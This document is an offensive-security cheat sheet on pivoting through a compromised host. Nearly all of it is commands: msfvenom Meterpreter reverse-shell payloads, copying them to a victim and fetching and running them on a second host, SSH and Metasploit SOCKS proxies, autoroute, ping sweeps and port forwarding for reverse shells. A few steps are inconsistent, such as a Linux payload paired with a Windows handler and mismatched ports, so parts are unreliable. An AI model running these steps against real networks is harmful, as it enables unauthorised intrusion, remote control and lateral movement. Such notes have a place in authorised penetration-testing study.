# Pivoting

## Proxy SOCKS with SSH

```bash
$ ssh -D 9050 root@victime
$ tail /etc/proxychains.conf
...
[ProxyList]
socks4 	127.0.0.1 9050
$ sudo proxychains nmap -sT -F other_host
```

To be noted:
 - Only TCP Connect Scan is supported by proxychains (default with nmap)
 - sudo is mandatory (RAW socket by proxychains)

## Reverse tunneling from other_host

### On attacker

```bash
$ msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=other_host -f elf -o reverse.bin LPORT=4444
$ scp reverse.bin root@victim:/tmp
$ ssh -D 9050 -R victim_other_ip:4444:0.0.0.0:8000 root@victim
$ msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000
msf6 exploit(multi/handler) > run
```

### On victim

```bash
$ cp /tmp
$ python -m http.server 8765
```

### On other_host

```bash
$ wget http://victim_other_ip:8765/reverse.bin
$ chmod +x reverse.bin
$ ./reverse.bin
```

### Pivoting from Victim

#### Scanning network 

 * From bash: `for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done`
 * From MSF: `msf6 exploit(multi/handler) >  run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/24`

#### Nmap scan:

##### Open SOCKS Proxy

From MSF (outside session)
```
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
msf6 auxiliary(server/socks_proxy) > run
msf6 auxiliary(server/socks_proxy) > jobs
```

##### Routing to our VM

To tell our socks_proxy module to route all the traffic via our Meterpreter session, we can use the post/multi/manage/autoroute module.
Then, we route all traffic through proxychains.

Before autoroute on **Victim**:

```bash
$ route -n

```

From MSF (outside meterpreter session)
```
[msf](Jobs:1 Agents:1) auxiliary(server/socks_proxy) >> use post/multi/manage/autoroute
[msf](Jobs:1 Agents:1) post(multi/manage/autoroute) >> set SESSION 1
[msf](Jobs:1 Agents:1) post(multi/manage/autoroute) >> set SUBNET 172.16.5.0
[msf](Jobs:1 Agents:1) post(multi/manage/autoroute) >> run
```

After autoroute on **Victim**:
```bash
$ route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         10.129.0.1      0.0.0.0         UG    0      0        0 ens192
10.129.0.0      0.0.0.0         255.255.0.0     U     0      0        0 ens192
172.16.4.0      0.0.0.0         255.255.254.0   U     0      0        0 ens224
```

##### Nmap scan with proxychains

```bash
$ tail /etc/proxychains4.conf 
[ProxyList]
socks4 	127.0.0.1 9050
$ sudo proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```

#### Ports forwarding

##### Local => Pivot => Victim

Useful to interact with a local post and use local tools.

 * Listen to the port 3300 on **Attacker**
 * Forward all packets to **victim:8080**

From MSF (inside meterpreter session)
```
(Meterpreter 1)(/home/ubuntu) > portfwd add -l 3300 -p 8080 -r victim
```

Interact with service
```bash
$ curl http://localhost:8080/
```

##### Victime => Pivot => Local

Useful to get reverse shell to connect to local meterpreter

From MSF (inside meterpreter session)
```
(Meterpreter 1)(/home/ubuntu) > portfwd add -R -l 8081 -p 1234 -L Attacker
```

A server is started on **victim**:
```
$ netstat -antop | grep 1234
tcp6       0      0 :::1234                 :::*                    LISTEN      1784/backupjob       off (0.00/0/0)
```

On **Attacker**, craft reverse meterpreter which connect to **victim**, upload and execute it onn **other_host**
```bash
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=victim -f exe -o backupscript.exe LPORT=1234
````

On **Attacker** :
```bash
$ msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
msf6 exploit(multi/handler) > set lport 8081
msf6 exploit(multi/handler) > run
```




